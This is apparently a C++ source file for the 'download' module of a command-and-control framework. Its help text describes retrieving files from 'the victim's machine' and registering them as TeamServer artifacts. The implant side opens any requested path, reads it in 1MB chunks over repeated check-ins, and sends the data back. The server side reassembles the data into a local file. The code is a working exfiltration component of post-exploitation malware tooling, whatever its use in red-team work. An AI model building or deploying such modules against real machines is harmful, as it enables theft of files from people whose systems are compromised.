#include "Download.hpp"

#include <cstring>

#include "Common.hpp"


using namespace std;


constexpr std::string_view moduleName = "download";
constexpr unsigned long long moduleHash = djb2(moduleName);


#ifdef _WIN32

__declspec(dllexport) Download* DownloadConstructor() 
{
    return new Download();
}

#else

__attribute__((visibility("default"))) Download* DownloadConstructor() 
{
    return new Download();
}

#endif


Download::Download()
#ifdef BUILD_TEAMSERVER
    : ModuleCmd(std::string(moduleName), moduleHash)
#else
    : ModuleCmd("", moduleHash)
#endif
{
}

Download::~Download()
{
}

std::string Download::getInfo()
{
    std::string info;
#ifdef BUILD_TEAMSERVER
    info += "Download Module:\n";
    info += "Retrieve a file from the victim's machine and register it as a generated TeamServer artifact.\n";
    info += "Large files are automatically split into 1MB chunks and transferred over multiple check-ins.\n";
    info += "\nUsage example:\n";
    info += " - download C:\\Temp\\toto.exe toto.exe\n";
    info += "\nArguments:\n";
    info += " <sourcePath>    Path to the file on the victim's machine\n";
    info += " <artifactName>  Optional generated artifact filename hint\n";
#endif
    return info;
}

int Download::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
{
#if defined(BUILD_TEAMSERVER) || defined(C2CORE_BUILD_TESTS)
    std::vector<std::string> quoteRegroupedCmd = regroupStrings(splitedCmd);

    if (quoteRegroupedCmd.size() == 3 && quoteRegroupedCmd[0] == moduleName)
    {
        string inputFile = quoteRegroupedCmd[1];
        string outputFile = quoteRegroupedCmd[2];

        c2Message.set_instruction(quoteRegroupedCmd[0]);
        c2Message.set_inputfile(inputFile);
        c2Message.set_outputfile(outputFile);
    }
    else
    {
        c2Message.set_returnvalue(getInfo());
        return -1;
    }
#endif

    return 0;
}


#define ERROR_OPEN_FILE 1 
#define ERROR_READ_FILE 2
#define ERROR_FILE_ALREADY_OPEN 3


const size_t CHUNK_SIZE = 1 * 1024 * 1024;


void Download::resetTransfer()
{
    m_input.close();
    m_input.clear();
    m_inputfile.clear();
    m_outputfile.clear();
    m_taskUuid.clear();
    m_fileSize = 0;
    m_bytesRead = 0;
}

int Download::emitNextChunk(C2Message& response)
{
    if (!m_input.is_open())
        return 0;

    response.set_instruction(std::to_string(moduleHash));
    response.set_cmd("");
    response.set_uuid(m_taskUuid);
    response.set_inputfile(m_inputfile);
    response.set_outputfile(m_outputfile);
    response.set_args(m_bytesRead == 0 ? "0" : "1");
    response.set_data(std::string{});
    response.set_returnvalue({});

    const std::streamsize remaining = m_fileSize - m_bytesRead;
    const std::streamsize chunkSize = (std::min)(static_cast<std::streamsize>(CHUNK_SIZE), remaining);
    if (chunkSize <= 0)
    {
        response.set_errorCode(ERROR_READ_FILE);
        resetTransfer();
        return 1;
    }

    std::string buffer(static_cast<std::size_t>(chunkSize), '\0');
    if (!m_input.read(buffer.data(), chunkSize))
    {
        response.set_errorCode(ERROR_READ_FILE);
        resetTransfer();
        return 1;
    }

    m_bytesRead += chunkSize;
    response.set_data(std::move(buffer));
    response.set_errorCode(0);
    if (m_bytesRead == m_fileSize)
    {
        response.set_returnvalue("Success");
        resetTransfer();
    }
    else
        response.set_returnvalue(std::to_string(m_bytesRead) + "/" + std::to_string(m_fileSize));
    return 1;
}

int Download::recurringExec(C2Message& response)
{
    return emitNextChunk(response);
}


int Download::process(C2Message &c2Message, C2Message &c2RetMessage)
{
    c2RetMessage.set_instruction(std::to_string(moduleHash));
    c2RetMessage.set_cmd("");
    c2RetMessage.set_uuid(c2Message.uuid());
    c2RetMessage.set_inputfile(c2Message.inputfile());
    c2RetMessage.set_outputfile(c2Message.outputfile());
    c2RetMessage.set_data(std::string{});
    c2RetMessage.set_returnvalue({});
    if(m_input.is_open())
    {
        c2RetMessage.set_errorCode(ERROR_FILE_ALREADY_OPEN);
        return 0;
    }

    m_inputfile = c2Message.inputfile();
    m_outputfile = c2Message.outputfile();
    m_taskUuid = c2Message.uuid();

    m_input.open(m_inputfile, std::ios::binary | std::ios::ate);
    m_bytesRead = 0;
    if (!m_input.is_open())
    {
        c2RetMessage.set_errorCode(ERROR_OPEN_FILE);
        resetTransfer();
        return 0;
    }
    m_fileSize = m_input.tellg();
    m_input.seekg(0, std::ios::beg);
    if (m_fileSize < 0 || !m_input)
    {
        c2RetMessage.set_errorCode(ERROR_READ_FILE);
        resetTransfer();
        return 0;
    }
    if (m_fileSize == 0)
    {
        c2RetMessage.set_args("0");
        c2RetMessage.set_returnvalue("Success");
        c2RetMessage.set_errorCode(0);
        resetTransfer();
        return 0;
    }
    emitNextChunk(c2RetMessage);
    return 0;
}


int Download::followUp(const C2Message &c2RetMessage)
{
#if defined(BUILD_TEAMSERVER) || defined(C2CORE_BUILD_TESTS)
    if (c2RetMessage.errorCode() != 0)
        return 0;
    if (c2RetMessage.outputfile().empty() ||
        (c2RetMessage.args() != "0" && c2RetMessage.args() != "1"))
        return -1;
    const auto mode = c2RetMessage.args() == "0"
        ? std::ios::binary | std::ios::trunc
        : std::ios::binary | std::ios::app;
    std::ofstream output(c2RetMessage.outputfile(), mode);
    if (!output)
        return -1;
    const std::string& buffer = c2RetMessage.data();
    output.write(buffer.data(), static_cast<std::streamsize>(buffer.size()));
    if (!output)
        return -1;
#endif

    return 0;
}


int Download::errorCodeToMsg(const C2Message &c2RetMessage, std::string& errorMsg)
{
#if defined(BUILD_TEAMSERVER) || defined(C2CORE_BUILD_TESTS)
    errorMsg.clear();
    int errorCode = c2RetMessage.errorCode();
    if(errorCode>0)
    {
        if(errorCode==ERROR_OPEN_FILE)
            errorMsg = "Failed: Couldn't open file";
        else if(errorCode==ERROR_READ_FILE)
            errorMsg = "Failed: Read file chunk.";
        else if(errorCode==ERROR_FILE_ALREADY_OPEN)
            errorMsg = "Failed: File already open.";        
    }
#endif
    return 0;
}
